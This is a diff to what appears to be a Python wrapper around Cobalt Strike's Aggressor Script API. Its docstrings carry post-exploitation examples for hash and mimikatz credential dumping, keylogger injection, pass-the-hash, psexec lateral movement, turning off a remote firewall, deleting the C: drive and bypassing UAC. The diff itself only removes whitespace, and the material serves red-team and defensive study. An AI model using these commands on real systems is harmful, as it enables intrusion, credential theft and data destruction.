@@ -1193,16 +1193,16 @@ def beacon_remove(*args, fork=False):
 def beacons(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information about all Beacons calling back to this Cobalt Strike team server.
         Returns
         An array of dictionary objects with information about each beacon.
         Example
-        
+
         foreach $beacon (beacons()) {
             println("Bid: " . $beacon['id'] . " is " . $beacon['name']);
         }
-        
+
     """
 
     return engine.call('beacons', args, fork=fork)
@@ -1211,24 +1211,24 @@ def beacons(*args, fork=False):
 def belevate(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to elevate with a memory corruption exploit.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the exploit to fire
         $3 - the listener to target.
         Example
-        
+
         item "&Elevate 31337" {
             openPayloadHelper(lambda({
                 binput($bids, "elevate ms14-058 $1");
                 belevate($bids, "ms14-058", $1);
             }, $bids => $1));
         }
-        
+
         See Also
         &beacon_exploit_describe, &beacon_exploit_register, &beacon_exploits
-        
+
     """
 
     return engine.call('belevate', args, fork=fork)
@@ -1237,17 +1237,17 @@ def belevate(*args, fork=False):
 def berror(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Publish an error message to the Beacon transcript
         Arguments
         $1 - the id for the beacon to post to
         $2 - the text to post
         Example
-        
+
         alias donotrun {
             berror($1, "You should never run this command!");
         }
-        
+
     """
 
     return engine.call('berror', args, fork=fork)
@@ -1256,15 +1256,15 @@ def berror(*args, fork=False):
 def bexecute(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to execute a command [without a shell]. This provides no output to the user.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command and arguments to run
         Example
-        
+
         bexecute($1, "notepad.exe");
-        
+
     """
 
     return engine.call('bexecute', args, silent=silent, fork=fork)
@@ -1273,24 +1273,24 @@ def bexecute(*args, silent=False, fork=False):
 def bexecute_assembly(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Spawns a local .NET executable assembly as a Beacon post-exploitation job.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the local path to the .NET executable assembly
         $3 - parameters to pass to the assembly
         Notes
-        
+
         This command accepts a valid .NET executable and calls its entry point.
         This post-exploitation job (like others) runs with the primary token of your Beacon process. It does not inherit Beacon's thread token.
         Compile your custom .NET programs with a .NET 3.5 compiler for compatability with systems that don't have .NET 4.0 and later.
-        
+
         Example
-        
+
         alias myutil {
             bexecute_assembly($1, script_resource("myutil.exe"), "arg1 arg2 \"arg 3\"");
         }
-        
+
     """
 
     return engine.call('bexecute_assembly', args, silent=silent, fork=fork)
@@ -1299,17 +1299,17 @@ def bexecute_assembly(*args, silent=False, fork=False):
 def bexit(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask a Beacon to exit.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "&Die" {
             binput($1, "exit");
             bexit($1);
         }
-        
+
     """
 
     return engine.call('bexit', args, fork=fork)
@@ -1318,18 +1318,18 @@ def bexit(*args, fork=False):
 def bgetprivs(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Attempts to enable the specified privilege in your Beacon session.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - a comma-separated list of privileges to enable. See:
         https://msdn.microsoft.com/en-us/library/windows/desktop/bb530716(v=vs.85).aspx
         Example
-        
+
         alias debug {
             bgetprivs($1, "SeDebugPriv");
         }
-        
+
     """
 
     return engine.call('bgetprivs', args, fork=fork)
@@ -1338,17 +1338,17 @@ def bgetprivs(*args, fork=False):
 def bgetsystem(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to attempt to get the SYSTEM token.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "Get &SYSTEM" {
             binput($1, "getsystem");
             bgetsystem($1);
         }
-        
+
     """
 
     return engine.call('bgetsystem', args, fork=fork)
@@ -1357,13 +1357,13 @@ def bgetsystem(*args, fork=False):
 def bgetuid(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to print the User ID of the current token
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
-        
+
         bgetuid($1);
-        
+
     """
 
     return engine.call('bgetuid', args, fork=fork)
@@ -1372,17 +1372,17 @@ def bgetuid(*args, fork=False):
 def bhashdump(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to dump local account password hashes.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "Dump &Hashes" {
             binput($1, "hashdump");
             bhashdump($1);
         }
-        
+
     """
 
     return engine.call('bhashdump', args, silent=silent, fork=fork)
@@ -1391,7 +1391,7 @@ def bhashdump(*args, silent=False, fork=False):
 def binfo(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Get information from a Beacon session's metadata.
         Arguments
         $1 - the id for the beacon to pull metadata for
@@ -1399,10 +1399,10 @@ def binfo(*args, fork=False):
         Returns
         A string with the requested information.
         Example
-        
+
         println("User is: " . binfo("1234", "user"));
         println("PID  is: " . binfo("1234", "pid"));
-        
+
     """
 
     return engine.call('binfo', args, fork=fork)
@@ -1411,7 +1411,7 @@ def binfo(*args, fork=False):
 def binject(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to inject a session into a specific process
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -1419,9 +1419,9 @@ def binject(*args, fork=False):
         $3 - the listener to target.
         $4 - the process architecture (x86 | x64)
         Example
-        
+
         binject($1, 1234, "my listener");
-        
+
     """
 
     return engine.call('binject', args, fork=fork)
@@ -1430,7 +1430,7 @@ def binject(*args, fork=False):
 def binjectsh(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Inject shellcode into a process.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -1438,9 +1438,9 @@ def binjectsh(*args, fork=False):
         $3 - x86|x64 - the architecture of the target process
         $3 - the local path to the file containing the shellcode.
         Example
-        
+
         binjectsh($1, 1234, "x86", script_resource("test.bin"));
-        
+
     """
 
     return engine.call('binjectsh', args, fork=fork)
@@ -1449,16 +1449,16 @@ def binjectsh(*args, fork=False):
 def binput(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Report a command was run to the Beacon console and logs. Scripts that execute commands for the user (e.g., events, popup menus) should use this function to assure operator attribution of automated actions in Beacon's logs.
         Arguments
         $1 - the id for the beacon to post to
         $2 - the text to post
         Example
-        
+
         # indicate the user ran the ls command
         binput($1, "ls");
-        
+
     """
 
     return engine.call('binput', args, fork=fork)
@@ -1467,19 +1467,19 @@ def binput(*args, fork=False):
 def bipconfig(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Task a Beacon to list network interfaces.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - callback function with the ipconfig results. Arguments to the callback are: $1 = beacon ID, $2 = results
         Example
-        
+
         alias ipconfig {
             bipconfig($1, {
                 blog($1, "Network information is:\n $+ $2");
             });
         }
-        
+
     """
 
     return engine.call('bipconfig', args, fork=fork)
@@ -1488,15 +1488,15 @@ def bipconfig(*args, fork=False):
 def bjobkill(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to kill a running post-exploitation job
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the job ID.
         Example
-        
+
         bjobkill($1, 0);
-        
+
     """
 
     return engine.call('bjobkill', args, fork=fork)
@@ -1505,14 +1505,14 @@ def bjobkill(*args, fork=False):
 def bjobs(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to list running post-exploitation jobs.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         bjobs($1);
-        
+
     """
 
     return engine.call('bjobs', args, silent=silent, fork=fork)
@@ -1521,17 +1521,17 @@ def bjobs(*args, silent=False, fork=False):
 def bkerberos_ccache_use(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask beacon to inject a UNIX kerberos ccache file into the user's kerberos tray
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the local path the ccache file
         Example
-        
+
         alias kerberos_ccache_use {
             bkerberos_ccache_use($1, $2);
         }
-        
+
     """
 
     return engine.call('bkerberos_ccache_use', args, fork=fork)
@@ -1540,16 +1540,16 @@ def bkerberos_ccache_use(*args, fork=False):
 def bkerberos_ticket_purge(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask beacon to purge tickets from the user's kerberos tray
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         alias kerberos_ticket_purge {
             bkerberos_ticket_purge($1);
         }
-        
+
     """
 
     return engine.call('bkerberos_ticket_purge', args, fork=fork)
@@ -1558,17 +1558,17 @@ def bkerberos_ticket_purge(*args, fork=False):
 def bkerberos_ticket_use(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask beacon to inject a mimikatz kirbi file into the user's kerberos tray
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the local path the kirbi file
         Example
-        
+
         alias kerberos_ticket_use {
             bkerberos_ticket_use($1, $2);
         }
-        
+
     """
 
     return engine.call('bkerberos_ticket_use', args, fork=fork)
@@ -1577,16 +1577,16 @@ def bkerberos_ticket_use(*args, fork=False):
 def bkeylogger(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Injects a keystroke logger into a process.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID to inject the keystroke logger into.
         $3 - the architecture of the target PID (x86|x64)
         Example
-        
+
         bkeylogger($1, 1234, "x64");
-        
+
     """
 
     return engine.call('bkeylogger', args, silent=silent, fork=fork)
@@ -1595,15 +1595,15 @@ def bkeylogger(*args, silent=False, fork=False):
 def bkill(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to kill a process
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the PID to kill
         Example
-        
+
         bkill($1, 1234);
-        
+
     """
 
     return engine.call('bkill', args, silent=silent, fork=fork)
@@ -1612,15 +1612,15 @@ def bkill(*args, silent=False, fork=False):
 def blink(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to link to a host over a named pipe
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target to link to
         Example
-        
+
         blink($1, "DC");
-        
+
     """
 
     return engine.call('blink', args, fork=fork)
@@ -1629,17 +1629,17 @@ def blink(*args, fork=False):
 def blog(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Post a message to WordPress.com (just kidding). Publishes an output message to the Beacon transcript.
         Arguments
         $1 - the id for the beacon to post to
         $2 - the text to post
         Example
-        
+
         alias demo {
             blog($1, "I am output for the blog function");
         }
-        
+
     """
 
     return engine.call('blog', args, fork=fork)
@@ -1648,17 +1648,17 @@ def blog(*args, fork=False):
 def blog2(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Publishes an output message to the Beacon transcript. This function has an alternate format from &blog
         Arguments
         $1 - the id for the beacon to post to
         $2 - the text to post
         Example
-        
+
         alias demo2 {
             blog2($1, "I am output for the blog2 function");
         }
-        
+
     """
 
     return engine.call('blog2', args, fork=fork)
@@ -1667,7 +1667,7 @@ def blog2(*args, fork=False):
 def bloginuser(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to create a token from the specified credentials. This is the make_token command.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -1675,14 +1675,14 @@ def bloginuser(*args, fork=False):
         $3 - the user's username
         $4 - the user's password
         Example
-        
+
         # make a token for a user with an empty password
         alias make_token_empty {
             local('$domain $user');
             ($domain, $user) = split("\\\\", $2);]
             bloginuser($1, $domain, $user, "");
         }
-        
+
     """
 
     return engine.call('bloginuser', args, fork=fork)
@@ -1691,17 +1691,17 @@ def bloginuser(*args, fork=False):
 def blogonpasswords(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to dump in-memory credentials with mimikatz
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         item "Dump &Passwords" {
             binput($1, "logonpasswords");
             blogonpasswords($1);
         }
-        
+
     """
 
     return engine.call('blogonpasswords', args, silent=silent, fork=fork)
@@ -1710,27 +1710,27 @@ def blogonpasswords(*args, silent=False, fork=False):
 def bls(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Task a Beacon to list files
         Variations
-        
+
         bls($1, "folder");
-        
+
         Output the results to the Beacon console.
-        
+
         bls($1, "folder", &callback);
-        
+
         Route results to the specified callback function.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the folder to list files for. Use . for the current folder.
         $3 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = the folder, $3 = results
         Example
-        
+
         on beacon_initial {
             bls($1, ".");
         }
-        
+
     """
 
     return engine.call('bls', args, fork=fork)
@@ -1739,17 +1739,17 @@ def bls(*args, fork=False):
 def bmimikatz(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a mimikatz command.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command and arguments to run
         Example
-        
+
         alias coffee {
             bmimikatz($1, "standard::coffee");
         }
-        
+
     """
 
     return engine.call('bmimikatz', args, fork=fork)
@@ -1758,15 +1758,15 @@ def bmimikatz(*args, fork=False):
 def bmkdir(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to make a directory
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the folder to create
         Example
-        
+
         bmkdir($1, "you are owned");
-        
+
     """
 
     return engine.call('bmkdir', args, silent=silent, fork=fork)
@@ -1775,18 +1775,18 @@ def bmkdir(*args, silent=False, fork=False):
 def bmode(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Change the data channel for a DNS Beacon.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the data channel (e.g., dns, dns6, dns-txt, or http)
         Example
-        
+
         item "Mode DNS-TXT" {
             binput($1, "mode dns-txt");
             bmode($1, "dns-txt");
         }
-        
+
     """
 
     return engine.call('bmode', args, fork=fork)
@@ -1795,16 +1795,16 @@ def bmode(*args, fork=False):
 def bmv(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to move a file or folder.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file or folder to move
         $3 - the destination
         Example
-        
+
         bmv($1, "evil.exe", "\\\\target\\\C$\\evil.exe");
-        
+
     """
 
     return engine.call('bmv', args, fork=fork)
@@ -1813,71 +1813,71 @@ def bmv(*args, fork=False):
 def bnet(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Run a command from Beacon's net module.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command to run.
-        
-        
+
+
         Type
         Description
-        
-        
+
+
         computers
         lists hosts in a domain (groups)
-        
-        
+
+
         dclist
         lists domain controllers
-        
-        
+
+
         domain_trusts
         lists domain trusts
-        
-        
+
+
         group
         lists groups and users in groups
-        
-        
+
+
         localgroup
         lists local groups and users in local groups
-        
-        
+
+
         logons
         lists users logged onto a host
-        
-        
+
+
         sessions
         lists sessions on a host
-        
-        
+
+
         share
         lists shares on a host
-        
-        
+
+
         user
         lists users and user information
-        
-        
+
+
         time
         show time for a host
-        
-        
+
+
         view
         lists hosts in a domain (browser service)
-        
-        
+
+
         $3 - the target to run this command against or $null
         $4 - the parameter to this command (e.g., a group name)
         Example
-        
+
         # ladmins [target]
         #   find the local admins for a target
         alias ladmins {
             bnet($1, "localgroup", $2, "administrators");
         }
-        
+
     """
 
     return engine.call('bnet', args, silent=silent, fork=fork)
@@ -1886,15 +1886,15 @@ def bnet(*args, silent=False, fork=False):
 def bnote(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Assign a note to the specified Beacon.
         Arguments
         $1 - the id for the beacon to post to
         $2 - the note content
         Example
-        
+
         bnote($1, "foo");
-        
+
     """
 
     return engine.call('bnote', args, fork=fork)
@@ -1903,7 +1903,7 @@ def bnote(*args, fork=False):
 def bpassthehash(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to create a token that passes the specified hash. This is the pth command in Beacon. It uses mimikatz.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -1911,9 +1911,9 @@ def bpassthehash(*args, fork=False):
         $3 - the user's username
         $4 - the user's password hash
         Example
-        
+
         bpassthehash($1, "GLITTER", "Administrator", $hash);
-        
+
     """
 
     return engine.call('bpassthehash', args, fork=fork)
@@ -1922,17 +1922,17 @@ def bpassthehash(*args, fork=False):
 def bpause(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to pause its execution. This is a one-off sleep.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - how long the Beacon should pause execution for (milliseconds)
         Example
-        
+
         alias pause {
             bpause($1, int($2));
         }
-        
+
     """
 
     return engine.call('bpause', args, fork=fork)
@@ -1941,7 +1941,7 @@ def bpause(*args, fork=False):
 def bportscan(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run its port scanner.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -1950,9 +1950,9 @@ def bportscan(*args, fork=False):
         $4 - the discovery method to use (arp|icmp|none)
         $5 - the max number of sockets to use (e.g., 1024)
         Example
-        
+
         bportscan($1, "192.168.12.0/24", "1-1024,6667", "arp", 1024);
-        
+
     """
 
     return engine.call('bportscan', args, fork=fork)
@@ -1961,18 +1961,18 @@ def bportscan(*args, fork=False):
 def bpowerpick(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Spawn a process, inject Unmanaged PowerShell, and run the specified command.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the cmdlet and arguments
         Example
-        
+
         # get the version of PowerShell available via Unmanaged PowerShell
         alias powerver {
             bpowerpick($1, '$PSVersionTable.PSVersion');
         }
-        
+
     """
 
     return engine.call('bpowerpick', args, silent=silent, fork=fork)
@@ -1981,18 +1981,18 @@ def bpowerpick(*args, silent=False, fork=False):
 def bpowershell(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a PowerShell cmdlet
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the cmdlet and arguments
         Example
-        
+
         # get the version of PowerShell...
         alias powerver {
             bpowershell($1, '$PSVersionTable.PSVersion');
         }
-        
+
     """
 
     return engine.call('bpowershell', args, silent=silent, fork=fork)
@@ -2001,19 +2001,19 @@ def bpowershell(*args, silent=False, fork=False):
 def bpowershell_import(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Import a PowerShell script into a Beacon
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the path to the local file to import
         Example
-        
+
         # quickly run PowerUp
         alias powerup {
             bpowershell_import($1, script_resource("PowerUp.ps1"));
             bpowershell($1, "Invoke-AllChecks");
         }
-        
+
     """
 
     return engine.call('bpowershell_import', args, silent=silent, fork=fork)
@@ -2022,7 +2022,7 @@ def bpowershell_import(*args, silent=False, fork=False):
 def bppid(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Set a parent process for Beacon's child processes
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2031,7 +2031,7 @@ def bppid(*args, fork=False):
         1. The current session must have rights to access the specified parent process.
         2. Attempts to spawn post-ex jobs under parent processes in another desktop session may fail. This limitation is due to how Beacon launches its "temporary" processes for post-exploitation jobs and injects code into them.
         Example
-        
+
         # getexplorerpid($bid, &callback);
         sub getexplorerpid {
             bps($1, lambda({
@@ -2044,14 +2044,14 @@ def bppid(*args, fork=False):
                 }
             }, $callback => $2));
         }
-        
+
         alias prepenv {
             btask($1, "Tasked Beacon to find explorer.exe and make it the PPID");
             getexplorerpid($1, {
                 bppid($1, $2);
             });
         }
-        
+
     """
 
     return engine.call('bppid', args, fork=fork)
@@ -2060,26 +2060,26 @@ def bppid(*args, fork=False):
 def bps(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Task a Beacon to list processes
         Variations
-        
+
         bps($1);
-        
+
         Output the results to the Beacon console.
-        
+
         bps($1, &callback);
-        
+
         Route results to the specified callback function.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - an optional callback function with the ps results. Arguments to the callback are: $1 = beacon ID, $2 = results
         Example
-        
+
         on beacon_initial {
             bps($1);
         }
-        
+
     """
 
     return engine.call('bps', args, fork=fork)
@@ -2088,7 +2088,7 @@ def bps(*args, fork=False):
 def bpsexec(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a payload on a remote host. This function generates an Artifact Kit executable, copies it to the target, and creates a service to run it. Clean up is included too.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2096,11 +2096,11 @@ def bpsexec(*args, fork=False):
         $3 - the listener to spawn
         $4 - the share to copy the executable to
         Example
-        
+
         brev2self();
         bloginuser($1, "CORP", "Administrator", "toor");
         bpsexec($1, "172.16.48.3", "my listener", "ADMIN\$");
-        
+
     """
 
     return engine.call('bpsexec', args, fork=fork)
@@ -2109,7 +2109,7 @@ def bpsexec(*args, fork=False):
 def bpsexec_command(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a command on a remote host. This function creates a service on the remote host, starts it, and cleans it up.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2117,13 +2117,13 @@ def bpsexec_command(*args, fork=False):
         $3 - the name of the service to create
         $4 - the command to run.
         Example
-        
+
         # disable the firewall on a remote target
         # beacon> shieldsdown [target]
         alias shieldsdown {
             bpsexec_command($1, $2, "shieldsdn", "cmd.exe /c netsh advfirewall set allprofiles state off");
         }
-        
+
     """
 
     return engine.call('bpsexec_command', args, fork=fork)
@@ -2132,18 +2132,18 @@ def bpsexec_command(*args, fork=False):
 def bpsexec_psh(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to spawn a payload on a remote host. This function creates a service to run a PowerShell one-liner.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the target to spawn a payload onto
         $3 - the listener to spawn
         Example
-        
+
         brev2self();
         bloginuser($1, "CORP", "Administrator", "toor");
         bpsexec_psh($1, "172.16.48.3", "my listener");
-        
+
     """
 
     return engine.call('bpsexec_psh', args, fork=fork)
@@ -2152,7 +2152,7 @@ def bpsexec_psh(*args, fork=False):
 def bpsinject(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Inject Unmanaged PowerShell into a specific process and run the specified cmdlet
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2160,9 +2160,9 @@ def bpsinject(*args, fork=False):
         $3 - the process architecture (x86 | x64)
         $3 - the cmdlet to run
         Example
-        
+
         bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
-        
+
     """
 
     return engine.call('bpsinject', args, fork=fork)
@@ -2171,16 +2171,16 @@ def bpsinject(*args, fork=False):
 def bpwd(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to print its current working directory
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         alias pwd {
             bpwd($1);
         }
-        
+
     """
 
     return engine.call('bpwd', args, silent=silent, fork=fork)
@@ -2189,18 +2189,18 @@ def bpwd(*args, silent=False, fork=False):
 def breg_query(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to query a key within the registry.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the path to the key
         $3 - x86|x64 - which view of the registry to use
         Example
-        
+
         alias typedurls {
             breg_query($1, "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "x86");
         }
-        
+
     """
 
     return engine.call('breg_query', args, fork=fork)
@@ -2209,7 +2209,7 @@ def breg_query(*args, fork=False):
 def breg_queryv(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to query a value within a registry key.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2217,11 +2217,11 @@ def breg_queryv(*args, fork=False):
         $3 - the name of the value to query
         $4 - x86|x64 - which view of the registry to use
         Example
-        
+
         alias winver {
             breg_queryv($1, "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", "x86");
         }
-        
+
     """
 
     return engine.call('breg_queryv', args, fork=fork)
@@ -2230,16 +2230,16 @@ def breg_queryv(*args, fork=False):
 def brev2self(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to drop its current token. This calls the RevertToSelf() Win32 API.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         Example
-        
+
         alias rev2self {
             brev2self($1);
         }
-        
+
     """
 
     return engine.call('brev2self', args, fork=fork)
@@ -2248,16 +2248,16 @@ def brev2self(*args, fork=False):
 def brm(*args, silent=False, fork=False):
     r""""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to remove a file or folder.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the file or folder to remove
         Example
-        
+
         # nuke the system
         brm($1, "c:\\");
-        
+
     """
 
     return engine.call('brm', args, silent=silent, fork=fork)
@@ -2266,7 +2266,7 @@ def brm(*args, silent=False, fork=False):
 def brportfwd(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to setup a reverse port forward.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2274,9 +2274,9 @@ def brportfwd(*args, fork=False):
         $3 - the host to forward connections to
         $4 - the port to forward connections to
         Example
-        
+
         brportfwd($1, 80, "192.168.12.88", 80);
-        
+
     """
 
     return engine.call('brportfwd', args, fork=fork)
@@ -2285,15 +2285,15 @@ def brportfwd(*args, fork=False):
 def brportfwd_stop(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to stop a reverse port forward
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the port bound on the target
         Example
-        
+
         brportfwd_stop($1, 80);
-        
+
     """
 
     return engine.call('brportfwd_stop', args, fork=fork)
@@ -2302,7 +2302,7 @@ def brportfwd_stop(*args, fork=False):
 def brunas(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a command as another user.
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
@@ -2311,9 +2311,9 @@ def brunas(*args, fork=False):
         $4 - the user's password
         $5 - the command to run
         Example
-        
+
         brunas($1, "CORP", "Administrator", "toor", "notepad.exe");
-        
+
     """
 
     return engine.call('brunas', args, fork=fork)
@@ -2322,22 +2322,22 @@ def brunas(*args, fork=False):
 def brunasadmin(*args, fork=False):
     r"""
     Documentation from https://www.cobaltstrike.com/aggressor-script/functions.html:
-        
+
         Ask Beacon to run a command in a high-integrity context (bypasses UAC).
         Arguments
         $1 - the id for the beacon. This may be an array or a single ID.
         $2 - the command and its arguments.
         Notes
         This command uses the Token Duplication UAC bypass. This bypass has a few requirements:
-        
+
         Your user must be a local admin
         If Always Notify is enabled, an existing high integrity process must be running in the current desktop session.
-        
+
         Example
-        
+
